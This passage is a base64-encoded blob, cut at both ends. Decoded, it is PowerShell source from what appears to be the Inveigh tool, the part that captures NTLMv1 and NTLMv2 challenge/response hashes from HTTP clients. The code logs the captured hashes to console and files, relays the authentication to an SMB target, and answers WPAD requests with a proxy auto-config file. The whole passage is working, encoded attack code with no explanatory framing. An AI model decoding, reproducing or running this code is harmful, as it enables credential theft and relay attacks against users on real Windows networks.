QoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlICROVExNX3R5cGUgY2hhbGxlbmdlL3Jlc3BvbnNlIGZvciAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBjYXB0dXJlZCBmcm9tICRIVFRQX3NvdXJjZV9JUCgkSFRUUF9OVExNX2hvc3Rfc3RyaW5nKSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoISRpbnZlaWdoLmNvbnNvbGVfdW5pcXVlIC1vciAoJGludmVpZ2guY29uc29sZV91bmlxdWUgLWFuZCAkaW52ZWlnaC5OVExNdjFfdXNlcm5hbWVfbGlzdCAtbm90Y29udGFpbnMgIiRIVFRQX3NvdXJjZV9JUCAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyIpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCQoR2V0LURhdGUgLWZvcm1hdCAncycpICsgIiAtICRIVFRQX3R5cGUgJE5UTE1fdHlwZSBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAgKCRIVFRQX05UTE1faG9zdF9zdHJpbmcpOmBuJEhUVFBfTlRMTV9oYXNoIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSArICIgLSAkSFRUUF90eXBlICROVExNX3R5cGUgY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmVkIGZyb20gJEhUVFBfc291cmNlX0lQICgkSFRUUF9OVExNX2hvc3Rfc3RyaW5nKTpgbiRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIC0gbm90IHVuaXF1ZSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQgLWFuZCAoISRpbnZlaWdoLmZpbGVfdW5pcXVlIC1vciAoJGludmVpZ2guZmlsZV91bmlxdWUgLWFuZCAkaW52ZWlnaC5OVExNdjFfdXNlcm5hbWVfbGlzdCAtbm90Y29udGFpbnMgIiRIVFRQX3NvdXJjZV9JUCAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyIpKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjFfZmlsZV9xdWV1ZS5BZGQoJEhUVFBfTlRMTV9oYXNoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkSFRUUF90eXBlICROVExNX3R5cGUgY2hhbGxlbmdlL3Jlc3BvbnNlIHdyaXR0ZW4gdG8gIiArICRpbnZlaWdoLk5UTE12MV9vdXRfZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5OVExNdjFfdXNlcm5hbWVfbGlzdCAtbm90Y29udGFpbnMgIiRIVFRQX3NvdXJjZV9JUCAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYxX3VzZXJuYW1lX2xpc3QuQWRkKCIkSFRUUF9zb3VyY2VfSVAgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmciKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSAjIE5UTE12MgogICAgICAgICAgICAgICAgICAgIHsgICAKICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE1fdHlwZSA9ICJOVExNdjIiICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE1fcmVzcG9uc2UgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRIVFRQX3JlcXVlc3RfYnl0ZXNbJEhUVFBfTlRMTV9vZmZzZXQuLigkSFRUUF9OVExNX29mZnNldCArICRIVFRQX05UTE1fbGVuZ3RoKV0pIC1yZXBsYWNlICItIiwiIgogICAgICAgICAgICAgICAgICAgICAgICAkTlRMTV9yZXNwb25zZSA9ICROVExNX3Jlc3BvbnNlLkluc2VydCgzMiwnOicpCiAgICAgICAgICAgICAgICAgICAgICAgICRIVFRQX05UTE1faGFzaCA9ICRIVFRQX05UTE1fdXNlcl9zdHJpbmcgKyAiOjoiICsgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nICsgIjoiICsgJE5UTE1fY2hhbGxlbmdlICsgIjoiICsgJE5UTE1fcmVzcG9uc2UKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCROVExNX2NoYWxsZW5nZSAtYW5kICROVExNX3Jlc3BvbnNlIC1hbmQgKCRpbnZlaWdoLm1hY2hpbmVfYWNjb3VudHMgLW9yICghJGludmVpZ2gubWFjaGluZV9hY2NvdW50cyAtYW5kIC1ub3QgJEhUVFBfTlRMTV91c2VyX3N0cmluZy5FbmRzV2l0aCgnJCcpKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12Ml9saXN0LkFkZCgkSFRUUF9OVExNX2hhc2gpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCQoR2V0LURhdGUgLWZvcm1hdCAncycpICsgIiAtICRIVFRQX3R5cGUgTlRMTXYyIGNoYWxsZW5nZS9yZXNwb25zZSBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgY2FwdHVyZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAoJEhUVFBfTlRMTV9ob3N0X3N0cmluZykiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSArICIgLSAkSFRUUF90eXBlIE5UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2UgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGNhcHR1cmVkIGZyb20gJEhUVFBfc291cmNlX0lQKCRIVFRQX05UTE1faG9zdF9zdHJpbmcpIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZighJGludmVpZ2guY29uc29sZV91bmlxdWUgLW9yICgkaW52ZWlnaC5jb25zb2xlX3VuaXF1ZSAtYW5kICRpbnZlaWdoLk5UTE12Ml91c2VybmFtZV9saXN0IC1ub3Rjb250YWlucyAiJEhUVFBfc291cmNlX0lQICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIikpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgKyAiIC0gJEhUVFBfdHlwZSBOVExNdjIgY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmVkIGZyb20gJEhUVFBfc291cmNlX0lQICgkSFRUUF9OVExNX2hvc3Rfc3RyaW5nKTpgbiRIVFRQX05UTE1faGFzaCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgKyAiIC0gJEhUVFBfdHlwZSBOVExNdjIgY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmVkIGZyb20gJEhUVFBfc291cmNlX0lQICgkSFRUUF9OVExNX2hvc3Rfc3RyaW5nKTpgbiRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIC0gbm90IHVuaXF1ZSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQgLWFuZCAoISRpbnZlaWdoLmZpbGVfdW5pcXVlIC1vciAoJGludmVpZ2guZmlsZV91bmlxdWUgLWFuZCAkaW52ZWlnaC5OVExNdjJfdXNlcm5hbWVfbGlzdCAtbm90Y29udGFpbnMgIiRIVFRQX3NvdXJjZV9JUCAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyIpKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjJfZmlsZV9xdWV1ZS5BZGQoJEhUVFBfTlRMTV9oYXNoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkSFRUUF90eXBlIE5UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2Ugd3JpdHRlbiB0byAiICsgJGludmVpZ2guTlRMTXYyX291dF9maWxlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLk5UTE12Ml91c2VybmFtZV9saXN0IC1ub3Rjb250YWlucyAiJEhUVFBfc291cmNlX0lQICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjJfdXNlcm5hbWVfbGlzdC5BZGQoIiRIVFRQX3NvdXJjZV9JUCAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICRIVFRQX3Jlc3BvbnNlX3N0YXR1c19jb2RlID0gMHgzMiwweDMwLDB4MzAKICAgICAgICAgICAgICAgICAgICAkSFRUUF9yZXNwb25zZV9waHJhc2UgPSAweDRmLDB4NGIKICAgICAgICAgICAgICAgICAgICAkSFRUUF9jbGllbnRfY2xvc2UgPSAkdHJ1ZQogICAgICAgICAgICAgICAgICAgICROVExNX2NoYWxsZW5nZSA9ICIiCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guU01CX3JlbGF5IC1hbmQgJHJlbGF5X3N0ZXAgLWVxIDIpCiAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoISRVc2VybmFtZXMgLW9yICRVc2VybmFtZXMgLWNvbnRhaW5zICRIVFRQX05UTE1fdXNlcl9zdHJpbmcgLW9yICRVc2VybmFtZXMgLWNvbnRhaW5zICIkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyIpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5tYWNoaW5lX2FjY291bnRzIC1vciAoISRpbnZlaWdoLm1hY2hpbmVfYWNjb3VudHMgLWFuZCAtbm90ICRIVFRQX05UTE1fdXNlcl9zdHJpbmcuRW5kc1dpdGgoJyQnKSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLlNNQlJlbGF5X2ZhaWxlZF9saXN0IC1ub3Rjb250YWlucyAiJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTZW5kaW5nICROVExNX3R5cGUgcmVzcG9uc2UgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGZvciByZWxheSB0byAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTZW5kaW5nICROVExNX3R5cGUgcmVzcG9uc2UgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGZvciByZWxheSB0byAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNlbmRpbmcgJE5UTE1fdHlwZSByZXNwb25zZSBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgZm9yIHJlbGF5IHRvICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTTUJSZWxheVJlc3BvbnNlICRTTUJfcmVsYXlfc29ja2V0ICRIVFRQX3JlcXVlc3RfYnl0ZXMgJFNNQl92ZXJzaW9uICRTTUJfdXNlcl9JRCAkU01CX3Nlc3Npb25fSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlbGF5X3N0ZXAgPSAwCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBBYm9ydGluZyByZWxheSBzaW5jZSAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBoYXMgYWxyZWFkeSBiZWVuIHRyaWVkIG9uICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEFib3J0aW5nIHJlbGF5IHNpbmNlICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGhhcyBhbHJlYWR5IGJlZW4gdHJpZWQgb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJBYm9ydGluZyBTTUIgcmVsYXkgc2luY2UgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgaGFzIGFscmVhZHkgYmVlbiB0cmllZCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9zb2NrZXQuQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVsYXlfc3RlcCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEFib3J0aW5nIHJlbGF5IHNpbmNlICRIVFRQX05UTE1fdXNlcl9zdHJpbmcgYXBwZWFycyB0byBiZSBhIG1hY2hpbmUgYWNjb3VudCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBBYm9ydGluZyByZWxheSBzaW5jZSAkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGFwcGVhcnMgdG8gYmUgYSBtYWNoaW5lIGFjY291bnQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIkFib3J0aW5nIFNNQiByZWxheSBzaW5jZSAkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGFwcGVhcnMgdG8gYmUgYSBtYWNoaW5lIGFjY291bnQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LkNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVsYXlfc3RlcCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIG5vdCBvbiByZWxheSB1c2VybmFtZSBsaXN0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgbm90IG9uIHJlbGF5IHVzZXJuYW1lIGxpc3QiKSAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBub3Qgb24gU01CIHJlbGF5IHVzZXJuYW1lIGxpc3QiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9zb2NrZXQuQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlbGF5X3N0ZXAgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBpZigkcHJveHlfbGlzdGVuZXIpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkSFRUUF9zZW5kID0gJGZhbHNlCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkSFRUUF9jbGllbnRfY2xvc2UgPSAkZmFsc2UKICAgICAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYoISRwcm94eV9saXN0ZW5lciAtYW5kICRXUEFEUmVzcG9uc2UgLWFuZCAkSFRUUF9yZXF1ZXN0X3Jhd19VUkwgLW1hdGNoICcvd3BhZC5kYXQnIC1hbmQgKCEkUHJveHlJZ25vcmUgLW9yICEoJFByb3h5SWdub3JlIHwgV2hlcmUtT2JqZWN0IHskSFRUUF9oZWFkZXJfdXNlcl9hZ2VudCAtbWF0Y2ggJF99KSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRIVFRQX21lc3NhZ2UgPSAkV1BBRFJlc3BvbnNlCiAgICAgICAgICAgICAgICAkSFRUUF9oZWFkZXJfY29udGVudF90eXBlID0gMHg0MywweDZmLDB4NmUsMHg3NCwweDY1LDB4NmUsMHg3NCwweDJkLDB4NTQsMHg3OSwweDcwLDB4NjUsMHgzYSwweDIwICsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiYXBwbGljYXRpb24veC1ucy1wcm94eS1hdXRvY29uZmlnIikKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJEhUVFBfdGltZXN0YW1wID0gR2V0LURhdGUgLWZvcm1hdCByCiAgICAgICAgICAgICRIVFRQX3RpbWVzdGFtcCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJEhUVFBfdGltZXN0YW1wKQogICAgICAgICAgICAkSFRUUF9oZWFkZXJfY29udGVudF9sZW5ndGggPSAweDQzLDB4NmYsMHg2ZSwweDc0LDB4NjUsMHg2ZSwweDc0LDB4MmQsMHg0YywweDY1LDB4NmUsMHg2NywweDc0LDB4NjgsMHgzYSwweDIwICsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkSFRUUF9tZXNzYWdlLkxlbmd0aCkKICAgICAgICAgICAgJEhUVFBfbWVzc2FnZV9ieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJEhUVFBfbWVzc2FnZSkKCiAgICAgICAgICAgIGlmKCRIVFRQX3JlcXVlc3RfcmF3X1VSTCAtbm90bWF0Y2ggJy93cGFkLmRhdCcgLW9yICgkV1BBREF1dGggLWxpa2UgJ05UTE0qJyAtYW5kICRIVFRQX3JlcXVlc3RfcmF3X1VSTCAtbWF0Y2ggJy93cGFkLmRhdCcpIC1hbmQgISRIVFRQX2NsaWVudF9jbG9zZSkKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICRIVFRQX2hlYWRlcl9hdXRoZW50aWNhdGVfZGF0YSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJE5UTE0pCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRwYWNrZXRfSFRUUFJlc3BvbnNlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkKICAgICAgICAgICAgJHBhY2tldF9IVFRQUmVzcG9uc2UuQWRkKCJIVFRQUmVzcG9uc2VfUmVxdWVzdFZlcnNpb24iLFtCeXRlW11dKDB4NDgsMHg1NCwweDU0LDB4NTAsMHgyZiwweDMxLDB4MmUsMHgzMSwweDIwKSkKICAgICAgICAgICAgJHBhY2tldF9IVFRQUmVzcG9uc2UuQWRkKCJIVFRQUmVzcG9uc2VfU3RhdHVzQ29kZSIsJEhUVFBfcmVzcG9uc2Vfc3RhdHVzX2NvZGUgKyBbQnl0ZVtdXSgweDIwKSkKICAgICAgICAgICAgJHBhY2tldF9IVFRQUmVzcG9uc2UuQWRkKCJIVFRQUmVzcG9uc2VfUmVzcG9uc2VQaHJhc2UiLCRIVFRQX3Jlc3BvbnNlX3BocmFzZSArIFtCeXRlW11dKDB4MGQsMHgwYSkpCiAgICAgICAgICAgICRwYWNrZXRfSFRUUFJlc3BvbnNlLkFkZCgiSFRUUFJlc3BvbnNlX1NlcnZlciIsW0J5dGVbXV0oMHg1MywweDY1LDB4NzIsMHg3NiwweDY1LDB4NzIsMHgzYSwweDIwLDB4NGQsMHg2OSwweDYzLDB4NzIsMHg2ZiwweDczLDB4NmYsMHg2NiwweDc0LDB4MmQsMHg0OCwweDU0LDB4NTQsMHg1MCwweDQxLDB4NTAsMHg0OSwweDJmLDB4MzIsMHgyZSwweDMwLDB4MGQsMHgwYSkpCiAgICAgICAgICAgICRwYWNrZXRfSFRUUFJlc3BvbnNlLkFkZCgiSFRUUFJlc3BvbnNlX1RpbWVTdGFtcCIsW0J5dGVbXV0oMHg0NCwweDYxLDB4NzQsMHg2NSwweDNhLDB4MjApICsgJEhUVFBfdGltZXN0YW1wICsgW0J5dGVbXV0oMHgwZCwweDBhKSkKICAgICAgICAgICAgJHBhY2tldF9IVFRQUmVzcG9uc2UuQWRkKCJIVFRQUmVzcG9uc2VfQ29udGVudExlbmd0aCIsJEhUVFBfaGVhZGVyX2NvbnRlbnRfbGVuZ3RoICsgW0J5dGVbXV0oMHgwZCwweDBhKSkKCiAgICAgICAgICAgIGlmKCRIVFRQX2hlYWRlcl9hdXRoZW50aWNhdGUgLWFuZCAkSFRUUF9oZWFkZXJfYXV0aGVudGljYXRlX2RhdGEpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRwYWNrZXRfSFRUUFJlc3BvbnNlLkFkZCgiSFRUUFJlc3BvbnNlX0F1dGhlbnRpY2F0ZUhlYWRlciIsJEhUVFBfaGVhZGVyX2F1dGhlbnRpY2F0ZSArICRIVFRQX2hlYWRlcl9hdXRoZW50aWNhdGVfZGF0YSAr